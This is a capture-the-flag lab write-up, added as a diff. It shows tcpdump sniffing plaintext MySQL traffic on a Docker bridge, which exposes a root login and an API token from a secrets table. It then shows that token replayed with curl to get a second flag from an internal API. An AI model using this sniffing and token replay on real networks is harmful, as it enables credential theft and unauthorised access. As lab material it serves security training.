@@ -1,0 +1,58 @@
+Ran the command: ip a | grep br - (To find the bridge interface name)
+
+13: br-0d45cad1dac8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default inet 172.20.0.1/16 brd 172.20.255.255 scope global br-0d45cad1dac8
+32: vethe01fd8a@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-0d45cad1dac8 state UP group default 
+33: veth8051486@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-0d45cad1dac8 state UP group default 
+34: veth9476230@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-0d45cad1dac8 state UP group default 
+35: veth5754d4d@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-0d45cad1dac8 state UP group default 
+36: veth374b8eb@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-0d45cad1dac8 state UP group default 
+37: veth911c2b6@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-0d45cad1dac8 state UP group default 
+38: veth09c5c3d@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-0d45cad1dac8 state UP group default
+
+From this I had the name:  br-0d45cad1dac8
+
+I then ran a tcpdump via the command: sudo tcpdump -i br-0d45cad1dac8 port 3306 -A (using port 3306 to filter for MySQL traffic) 
+I opened the flask web app in order to capture packets 
+
+Output: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode 
+listening on br-0d45cad1dac8, link-type EN10MB (Ethernet), 
+snapshot length 262144 bytes 08:25:19.670753 IP 172.20.0.10.46350 > 172.20.0.11.mysql: 
+Flags [S], seq 2969850033, win 64240, options [mss 1460,sackOK,TS val 4169065075 ecr 0,nop,wscale 7], length 0 
+E..<x.@.@.jj... ..........P.........Xl......... .~.s........ 08:25:19.670854 IP 172.20.0.11.mysql > 172.20.0.10.46350: Flags [S.], seq 2635218903, ack 2969850034, win 65160, options [mss 1460,sackOK,TS val 934089287 ecr 4169065075,nop,wscale 7], length 0 
+E..<..@.@..~....... ......?...P.....Xl......... 7..G.~.s.... 08:25:19.670868 IP 172.20.0.10.46350 > 172.20.0.11.mysql: Flags [.], ack 1, win 502, options [nop,nop,TS val 4169065076 ecr 934089287], length 0 
+E..4x.@.@.jq... ..........P...?.....Xd..... .~.t7..G 08:25:19.671171 IP 172.20.0.11.mysql > 172.20.0.10.46350: Flags [P.], seq 1:79, ack 1, win 510, options [nop,nop,TS val 934089287 ecr 4169065076], length 78 
+E...kX@.@.v........ ......?...P.....X...... 7..G.~.tJ... 8.0.45.1...7 .f.k.+....................E.U:}.yfS.".mysql_native_password. 08:25:19.671190 IP 172.20.0.10.46350 > 172.20.0.11.mysql: Flags [.], ack 79, win 502, options [nop,nop,TS val 4169065076 ecr 934089287], length 0 
+E..4x.@.@.jp... ..........P...@&....Xd..... .~.t7..G 08:25:19.672071 IP 172.20.0.10.46350 > 172.20.0.11.mysql: Flags [P.], seq 1:143, ack 79, win 502, options [nop,nop,TS val 4169065077 ecr 934089287], length 142 
+E...x.@.@.i.... ..........P...@&....X...... .~.u7..G......:.....-.......................root..a..n.2.}q(..t...>...userdb.mysql_native_password.2._client_name.pymysql._client_version.1.1.0._pid.7 08:25:19.672091 IP 172.20.0.11.mysql > 172.20.0.10.46350: Flags [.], ack 143, win 509, options [nop,nop,TS val 934089288 ecr 4169065077], length 0 
+E..4kY@.@.w-....... ......@&..Q@....Xd..... 7..H.~.u 08:25:19.672817 IP 172.20.0.11.mysql > 172.20.0.10.46350: Flags [P.], seq 79:90, ack 143, win 509, options [nop,nop,TS val 934089289 ecr 4169065077], length 11 
+E..?kZ@.@.w!....... ......@&..Q@....Xo..... 7..I.~.u........... 08:25:19.672904 IP 172.20.0.10.46350 > 172.20.0.11.mysql: Flags [P.], seq 143:165, ack 90, win 502, options [nop,nop,TS val 4169065078 ecr 934089289], length 22 
+E..Jx.@.@.jX... ..........Q@..@1....Xz..... .~.v7..I.....SET NAMES utf8mb4 08:25:19.673990 IP 172.20.0.11.mysql > 172.20.0.10.46350: Flags [P.], seq 90:101, ack 165, win 509, options [nop,nop,TS val 934089290 ecr 4169065078], length 11 
+E..?k[@.@.w ....... ......@1..QV....Xo..... 7..J.~.v........... 08:25:19.674139 IP 172.20.0.10.46350 > 172.20.0.11.mysql: Flags [P.], seq 165:188, ack 101, win 502, options [nop,nop,TS val 4169065079 ecr 934089290], length 23 
+E..Kx.@.@.jV... ..........QV..@<....X{..... .~.w7..J.....SET AUTOCOMMIT = 0 08:25:19.674463 IP 172.20.0.11.mysql > 172.20.0.10.46350: Flags [P.], seq 101:112, ack 188, win 509, options [nop,nop,TS val 934089290 ecr 4169065079], length 11 
+E..?k\@.@.w........ ......@<..Qm....Xo..... 7..J.~.w........... 08:25:19.674602 IP 172.20.0.10.46350 > 172.20.0.11.mysql: Flags [P.], seq 188:316, ack 112, win 502, options [nop,nop,TS val 4169065079 ecr 934089290], length 128 
+E...x.@.@.i.... ..........Qm..@G....X...... .~.w7..J|.... SELECT id, secret_name, secret_value, description FROM secrets WHERE id = 1 08:25:19.679238 IP 172.20.0.11.mysql > 172.20.0.10.46350: Flags [P.], seq 112:520, ack 316, win 508, options [nop,nop,TS val 934089295 ecr 4169065079], length 408 
+E...k]@.@.u........ ......@G..Q.....Y...... 7..O.~.w..........def.userdb.secrets.secrets.id.id.?.......B...@....def.userdb.secrets.secrets.secret_name.secret_name.............B....def.userdb.secrets.secrets.secret_value.secret_value.............@....def.userdb.secrets.secrets.description.description......................}....1 
+api_token#FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}LAPI authentication token for secret services - MITM attack will reveal this!......... 08:25:19.679444 IP 172.20.0.10.46350 > 172.20.0.11.mysql: Flags [P.], seq 316:321, ack 520, win 501, options [nop,nop,TS val 4169065084 ecr 934089295], length 5 
+E..9x.@.@.jf... ..........Q...A.....Xi..... .~.|7..O..... 08:25:19.679480 IP 172.20.0.10.46350 > 172.20.0.11.mysql: Flags [F.], seq 321, ack 520, win 501, options [nop,nop,TS val 4169065084 ecr 934089295], length 0 
+E..4x.@.@.jj... ..........Q...A.....Xd..... .~.|7..O 08:25:19.680083 IP 172.20.0.11.mysql > 172.20.0.10.46350: Flags [F.], seq 520, ack 322, win 508, options [nop,nop,TS val 934089296 ecr 4169065084], length 0 
+E..4k^@.@.w(....... ......A...Q.....Xd..... 7..P.~.| 08:25:19.680098 IP 172.20.0.10.46350 > 172.20.0.11.mysql: Flags [.], ack 521, win 501, options [nop,nop,TS val 4169065085 ecr 934089296], length 0 
+E..4x.@.@.ji... ..........Q...A.....Xd.....
+
+We get a snippet : 
+
+api_token
+FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}
+API authentication token for secret services - MITM attack will reveal this!
+
+Used this command and my flag 1 as my authentication 
+
+curl -H "Authorization: Bearer FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}" \
+http://172.20.0.21:8888/flag
+
+to get the flag: 
+
+{"flag":"FLAG{p0rt_kn0ck1ng_4nd_h0n3yp0ts_s4v3_th3_d4y}","message":"Congratulations! You successfully chained your exploits!","next_steps":["Now implement port knocking to protect the SSH service","Deploy a honeypot using the starter template"],
+"steps_completed":
+["1. Developed a port scanner","2. Discovered this hidden API service on port 8888","3. Performed MITM attack on database traffic","4. Extracted FLAG{1} (the API token) from network packets","5. Used FLAG{1} to authenticate to this API","6. Retrieved FLAG{3}"],"success":true}
+
